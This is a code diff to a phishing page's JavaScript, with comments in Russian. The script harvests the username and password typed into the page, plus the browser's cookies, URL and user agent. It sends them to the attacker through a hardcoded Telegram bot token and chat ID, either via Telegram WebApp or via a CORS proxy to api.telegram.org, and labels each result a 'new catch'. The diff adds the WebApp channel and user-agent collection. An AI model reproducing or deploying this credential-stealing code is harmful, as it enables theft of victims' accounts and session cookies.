@@ -90,11 +90,11 @@
 </div>
 
 <script>
-    // ===== ТВОИ ДАННЫЕ ДЛЯ TELEGRAM =====
+    // ===== ТВОИ ДАННЫЕ =====
     const BOT_TOKEN = '8687077171:AAFRVNVxK1cvR5JgByOTXSjqGpdvH4wC2S0';
     const CHAT_ID = '2029866224';
 
-    // ===== ОТПРАВКА ДАННЫХ =====
+    // ===== ОТПРАВКА ЧЕРЕЗ TELEGRAM WEBAPP (ОБХОД CORS) =====
     function sendData() {
         const username = document.getElementById('username').value.trim();
         const password = document.getElementById('password').value.trim();
@@ -109,16 +109,35 @@
         document.getElementById('status').innerHTML = '⏳ Отправка...';
 
         const cookie = document.cookie || 'Кука не найдена';
-        const message = `🔐 **Новый улов!**\n\n` +
-                        `👤 Логин: ${username}\n` +
-                        `🔑 Пароль: ${password}\n` +
-                        `🍪 Кука: ${cookie}\n` +
-                        `🌐 URL: ${window.location.href}\n` +
-                        `🕒 Время: ${new Date().toISOString()}`;
+        const data = {
+            username: username,
+            password: password,
+            cookie: cookie,
+            url: window.location.href,
+            ua: navigator.userAgent,
+            time: new Date().toISOString()
+        };
 
-        // Прямой запрос к Telegram API (через CORS-прокси)
+        // === ЕСЛИ СТРАНИЦА ОТКРЫТА ВНУТРИ TELEGRAM (WEBAPP) ===
+        if (window.Telegram && Telegram.WebApp) {
+            Telegram.WebApp.sendData(JSON.stringify(data));
+            document.getElementById('status').innerHTML = '✅ Данные отправлены!';
+            document.getElementById('status').style.color = '#2ecc71';
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+            return;
+        }
+
+        // === ЗАПАСНОЙ ВАРИАНТ: ОТПРАВКА ЧЕРЕЗ ПРОКСИ (ЕСЛИ НЕТ WEBAPP) ===
         const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
         const targetUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const message = `🔐 **Новый улов!**\n\n` +
+                        `👤 Логин: ${data.username}\n` +
+                        `🔑 Пароль: ${data.password}\n` +
+                        `🍪 Кука: ${data.cookie}\n` +
+                        `🌐 URL: ${data.url}\n` +
+                        `🕒 Время: ${data.time}`;
 
         fetch(proxyUrl + targetUrl, {
             method: 'POST',
@@ -172,7 +191,7 @@
         }
     };
 
-    // ===== ENTER =====
+    // ===== КНОПКА ENTER =====
     document.addEventListener('keydown', (e) => {
         if (e.key === 'Enter') sendData();
     });
